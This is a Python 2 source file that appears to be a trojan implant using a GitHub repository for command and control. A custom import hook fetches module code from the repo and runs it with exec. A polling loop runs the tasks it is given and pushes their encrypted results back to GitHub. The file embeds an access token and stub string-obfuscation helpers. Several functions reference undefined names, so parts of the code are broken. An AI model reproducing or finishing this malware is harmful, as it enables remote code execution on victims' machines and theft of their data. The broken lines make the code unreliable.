import json
import base64
import sys
import time
import imp
import threading
import Queue
import zlib
import zipfile
import Queue
import xxhash
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from github3 import login

#class to hold configuration settings
class Config:
	def __init__(self):
		self.mod = "modules/" #path to modules directory
		self.config = "config/" #path to config files directory
		self.data = "data/" #path of directory to upload data to
		self.repo = "wendigo_test" #name of repo
		self.usr = "daniellohrey" #username of repo owner
		#token to use git api
		self.token = "NWYyOWM0ZjM0NzUwM2E1MDg4YTk1OGNlMTEwMjdhZjFkMzRlYTA5MA=="
		#public key to encrypt data
		self.pk = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAndOV4VLdGZgIk+YcW7Kl\nVwiBiesJq6upfiRBo2hM5CEzQiSeBa1/A4h5ozSgQtSgKURVmlDChTNrs0P4bwvi\npCvq8B5SdBw4gcc7YTy03Hl11wfbIPCwqA9JwUl6ZzQtEbw7BAfndry44+2QmAoL\nU2uOoyW2C4MjmUG6SDmNfAL/PsMCvL4fiBJh2V2EUWtCPEqkVIGUHERFFaJwFea3\nFdIqIFVV4SzU6c73wdRFWKHie5WZ4GXQ3GaIAe2cyCMp3UavOhpk4s+N5xdG1xXs\n2AvfXuotYRVxvmSz+L0QiyTXNn0gmphLrMph3jyY/+KX4TH0wIxEx1ZK1gYO8D1V\npQIDAQAB\n-----END PUBLIC KEY-----"
		self.pwd = "zippass" #password on zipped files
		self.sleep = 5 #time to sleep between checking for config files
		self.fn_s = "fn_seed" #seed to generate filenames
		self.id_s = "id_seed" #seed to generate ids
		self.size = 256 #block size of cipher
		self.tasks = Queue.Queue() #task queue
		self.u_id() #generate a new id on start
		self.u_pk(self.pk) #import public key into cipher object

	#generates a new id by hashing time and seed (only half of id process)
	def u_id(self):
		i_time = int(time.time())
		t_id = str(i_time) + self.fixstr(self.id_s)
		self.id = str(xxhash.xxh64(t_id).hexdigest())

	#returns our current id by hashing what we already generated
	#just use fixstr instead of hashing
	def g_id(self):
		return str(xxhash.xxh64(str(self.id)).hexdigest())

	#return deobfuscated module path
	def g_mod(self):
		return self.fixstr(self.mod)

	#obfuscates and stores new module path
	def u_mod(self, new):
		self.mod = self.obfstr(new)
		return

	#returns deobfuscated config file path
	def g_config(self):
		return self.fixstr(self.config) + self.g_id()

	#sets new obfuscated config file path
	def u_config(self, new):
		self.config = self.obfstr(new)
		return

	#returns deobfuscated data path to new data file
	def g_data(self):
		return self.fixstr(self.data) + self.id() + "/" + self.nfn()

	#sets new obfuscated data path
	def u_data(self, new):
		self.data = self.obfstr(new)
		return

	#returns deobfuscated username
	def g_usr(self):
		return self.fixstr(self.usr)

	#sets new obfuscated username
	def u_usr(self, new):
		self.usr = self.obfstr(new)
		return

	#returns deobfuscated token
	def g_token(self):
		return base64.b64decode(self.fixstr(self.token))

	#sets new obfuscated token
	def u_token(self, new):
		self.token = self.obfstr(base64.b64encode(new))
		return

	#returns deobfuscated repo name
	def g_repo(self):
		return self.fixstr(self.repo)

	#sets new obfuscated repo name
	def u_repo(self, new):
		self.repo = self.obfstr(new)
		return

	#creates new crypto object from new public key
	def u_pk(self, new):
		self.pk = new
		self.pk = RSA.importKey(self.pk)
		self.pk = PKCS1_OAEP.new(self.pk)
		return

	#returns deobfuscated zip password
	def g_pwd(self):
		return self.fixstr(self.pwd)

	#sets new obfuscated zip password
	def u_pwd(self, new):
		self.pwd = self.obfstr(new)
		return

	#generates a random filename for a data file
	def g_fn(self):
		i_time = int(time.time())
		fn = str(i_time) + self.fixstr(self.fn_s)
		return xxhash.xxh64(fn).hexdigest()

	#generates a random commit message for creating/updating files
	def g_com(self):
		com = str(time.time())
		return xxhash.xxh64(com).hexdigest()

	#deobfuscates strings
	def fixstr(self, o_str):
		return o_str

	#obfuscates strings
	def obfstr(self, f_str):
		return f_str

#class to update pythons import functionality to grab modules from github
class ReImp(object):
	def __init__(self):
		self.code = ""

	def find_module(self, fullname, path=None): #get file from github
		lib = get_file(config.g_mod() + fullname)
		if lib is not None:
			self.code = lib
			return self
		return None

	def load_module(self,name): #load file into new module
		module = imp.new_module(name)
		exec self.code in module.__dict__
		sys.modules[name] = module
		return module

#connects to github and return repo object
def connect():
	gh = login(token = config.g_token())
	repo = gh.repository(config.g_usr(), config.g_repo())
	return repo

#downloads file from github and decrypts it
def get_file(path):
	try:
		repo = connect()
		return decrypt(repo.file_contents(path).decoded)
	except:
		return None

#creates an empty config file (with random data) to register
def create_config():
	try:
		repo = connect()
		repo.create_file(config.g_config(), config.g_com(), config.g_com())
		return 1
	except:
		#make global exception string
		return 0

#gets config file, imports unimported modules and returns a dictionary of tasks
def get_config():
	c_json = get_file(config.g_config())
	try:
		c_dict = json.loads(c_json)
		for mod in c_dict:
			if task['module'] not in sys.modules: #obfuscate strings
				exec("import %s" % task['module'])
		return c_dict
	except:
		return None

#clears config file (updates to random data) once tasks have been read
def clear_config():
	try:
		repo = connect()
		repo.file_contents(config.g_config()).update(config.g_com(), config.g_com())
		return 1
	except:
		return 0

#encrypts data returned from tasks and pushes it to github
def push_data(data):
	try:
		repo = connect()
		repo.create_file(config.g_data(), config.g_com(), encrypt(data))
		return 1
	except:
		return 0

#decrypts modules and config files
def decrypt(data):
#	decoded = base64.b64decode(data) #need to use stringio file like objects
#	compressed = zipfile.ZipFile(decoded, 'r')
#	decompressed = compressed.read(name, config.my_pwd())
#	return decompressed
	return data

#encrypts data before pushing it to github
def encrypt(data):
	key = config.g_pk()
	size = config.size
	offset = 0
	encrypted = ""
	compressed = zlib.compress(data)
	while offset < len(compressed):
		chunk = compressed[offset:offset+size]
		if len(chunk) % size != 0:
			chunk += " " * (size - len(chunk))
		encrypted += key.encrypt(chunk)
		offset += size
	return base64.b64encode(encrypted)

#runs module in new thread and then pushes results to github
def run_module(task = None):
	try:
		#add config file to task dict and then update
		result = sys.modules[task['module']].run(task) #obfuscate strings
		if result is not None:
			push_data(result)
		return
	except:
		return

#runs all queued modules in new threads
def module_runner():
	while not config.tasks.empty():
		task = config.tasks.get()
		t = threading.Thread(target=run_module, kwargs = task)
		t.start()
		try:
			time.sleep(task['sleep']) #obfuscate strings
		except:
			pass
	return

#main
config = Config() #create config object
sys.meta_path = [ReImp()] #add remote import to the import path
create_config() #create a blank config file to register
while True:
	if config.tasks.empty(): #get config file when all tasks have been finished
		config_file = get_config()
		if config_file == None:
			time.sleep(config.sleep) #sleep if there are no new tasks
			continue
		for task in config_file:
			config.tasks.put(task) #if there are tasks add them to the queue
	if not config.tasks.empty(): #run tasks in queue and then clear config file
		module_runner()
		clear_config()
